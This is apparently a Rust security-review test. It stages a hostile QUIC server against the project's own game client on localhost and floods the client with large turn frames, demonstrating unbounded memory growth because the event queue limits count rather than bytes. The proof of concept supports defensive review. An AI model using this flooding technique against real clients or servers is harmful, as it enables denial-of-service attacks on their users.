//! Memory proof of concept from the security review: a hostile server and a
//! real `tpf3mp-agent` client in one process, with a counting allocator.
//! Passes while the finding exists:
//!
//! ```sh
//! cargo test -p tpf3mp-agent --test poc_client_memory -- --ignored --nocapture
//! ```

#![allow(unsafe_code, clippy::unwrap_used)]

use std::{
    alloc::{GlobalAlloc, Layout, System},
    sync::{
        Arc,
        atomic::{AtomicUsize, Ordering::Relaxed},
    },
    time::Duration,
};

use tpf3mp_agent::{ConnectOptions, connect};
use tpf3mp_net::{
    Identity, ServerIdentity, ServerTrust, read_message, read_preamble, server_config,
    write_message, write_preamble,
};
use tpf3mp_proto::{
    CONTROL_MAX_FRAME, ClientMessage, Event, EventBody, FixedBytes, PROTOCOL_VERSION, PlayerId,
    RoomId, ServerMessage, SessionId, Speed, TURN_MAX_FRAME, Text, Turn, TurnMessage, TurnStart,
    Welcome,
};

struct Counting;

static LIVE: AtomicUsize = AtomicUsize::new(0);

// SAFETY: every method forwards to the system allocator unchanged and only
// updates a counter.
unsafe impl GlobalAlloc for Counting {
    unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
        let ptr = unsafe { System.alloc(layout) };
        if !ptr.is_null() {
            LIVE.fetch_add(layout.size(), Relaxed);
        }
        ptr
    }

    unsafe fn alloc_zeroed(&self, layout: Layout) -> *mut u8 {
        let ptr = unsafe { System.alloc_zeroed(layout) };
        if !ptr.is_null() {
            LIVE.fetch_add(layout.size(), Relaxed);
        }
        ptr
    }

    unsafe fn dealloc(&self, ptr: *mut u8, layout: Layout) {
        unsafe { System.dealloc(ptr, layout) };
        LIVE.fetch_sub(layout.size(), Relaxed);
    }

    unsafe fn realloc(&self, ptr: *mut u8, layout: Layout, new_size: usize) -> *mut u8 {
        let new = unsafe { System.realloc(ptr, layout, new_size) };
        if !new.is_null() {
            if new_size >= layout.size() {
                LIVE.fetch_add(new_size - layout.size(), Relaxed);
            } else {
                LIVE.fetch_sub(layout.size() - new_size, Relaxed);
            }
        }
        new
    }
}

#[global_allocator]
static GLOBAL: Counting = Counting;

const FRAMES: u64 = 64;
/// Small events that fill most of a 1 MiB turn frame.
const EVENTS_PER_TURN: u64 = 26_000;
/// `EVENT_QUEUE` in `tpf3mp-agent`: the bound counts events, not bytes.
const EVENT_QUEUE: f64 = 4096.0;

/// FINDING: the agent's event channel (`EVENT_QUEUE` = 4096) bounds the
/// number of queued `ClientEvent`s, not their size, and a `Turn` may fill a
/// 1 MiB frame that decodes to about twice that. A server (or a room whose
/// members send large intents) can therefore make the agent hold gigabytes
/// while the game is not draining events, such as during a loading screen.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
#[ignore = "security PoC (demonstration, passes while the finding exists)"]
async fn poc_hostile_server_fills_the_client_event_queue() {
    let identity = ServerIdentity::self_signed(&["localhost"]).unwrap();
    let leaf = identity.leaf().clone();
    let endpoint = quinn::Endpoint::server(
        server_config(identity).unwrap(),
        "127.0.0.1:0".parse().unwrap(),
    )
    .unwrap();
    let address = endpoint.local_addr().unwrap();
    let (go, wait_for_go) = tokio::sync::oneshot::channel::<()>();
    let server = tokio::spawn(async move {
        let connection = endpoint.accept().await.unwrap().await.unwrap();
        let (mut send, mut recv) = connection.accept_bi().await.unwrap();
        read_preamble(&mut recv).await.unwrap();
        write_preamble(&mut send, PROTOCOL_VERSION).await.unwrap();
        let _hello: ClientMessage = read_message(&mut recv, CONTROL_MAX_FRAME).await.unwrap();
        let welcome = ServerMessage::Welcome(Welcome {
            server_version: Text::new("hostile").unwrap(),
            session_id: SessionId([0; 16]),
        });
        write_message(&mut send, &welcome, CONTROL_MAX_FRAME)
            .await
            .unwrap();
        wait_for_go.await.unwrap();
        let mut turns = connection.open_uni().await.unwrap();
        write_preamble(&mut turns, PROTOCOL_VERSION).await.unwrap();
        let start = TurnMessage::Start(TurnStart {
            room: RoomId(FixedBytes([0; 16])),
            next_turn: 1,
            next_event: 1,
            steps_per_second: 5,
            checkpoint_interval: 10,
        });
        write_message(&mut turns, &start, TURN_MAX_FRAME)
            .await
            .unwrap();
        let mut seq = 1;
        let mut wire = 0;
        for number in 1..=FRAMES {
            let events = (0..EVENTS_PER_TURN)
                .map(|_| {
                    seq += 1;
                    Event {
                        seq: seq - 1,
                        step: 1,
                        body: EventBody::PlayerLeft {
                            player: PlayerId(FixedBytes([7; 32])),
                        },
                    }
                })
                .collect();
            let turn = TurnMessage::Turn(Turn {
                number,
                sealed_through: 0,
                speed: Speed::NORMAL,
                events,
            });
            let frame = tpf3mp_proto::encode_frame(&turn, TURN_MAX_FRAME).unwrap();
            wire += frame.len();
            turns.write_all(&frame).await.unwrap();
        }
        (endpoint, connection, send, turns, wire)
    });

    let player = Arc::new(Identity::generate().unwrap().0);
    let (client, events) = connect(ConnectOptions::new(
        address,
        "localhost",
        ServerTrust::Pinned(leaf),
        player,
        Text::new("victim").unwrap(),
    ))
    .await
    .unwrap();
    tokio::time::sleep(Duration::from_millis(300)).await;
    let before = LIVE.load(Relaxed);
    go.send(()).unwrap();
    let (_endpoint, _connection, _send, _turns, wire) = server.await.unwrap();
    // The game is busy (a loading screen) and does not read events yet.
    tokio::time::timeout(Duration::from_secs(30), async {
        while (events.len() as u64) < FRAMES + 1 {
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    })
    .await
    .expect("the client queues every turn");
    let held = LIVE.load(Relaxed).saturating_sub(before) as f64;
    let per_turn = held / FRAMES as f64;
    println!(
        "{FRAMES} turns ({:.1} MiB on the wire) sit in the client's event queue: {:.1} MiB \
         held, {:.2} MiB per turn; a full queue of {EVENT_QUEUE} turns holds about {:.1} GiB",
        wire as f64 / 1048576.0,
        held / 1048576.0,
        per_turn / 1048576.0,
        per_turn * EVENT_QUEUE / 1073741824.0,
    );
    drop(events);
    drop(client);
    assert!(per_turn > 1_000_000.0, "only {per_turn} bytes per turn");
}
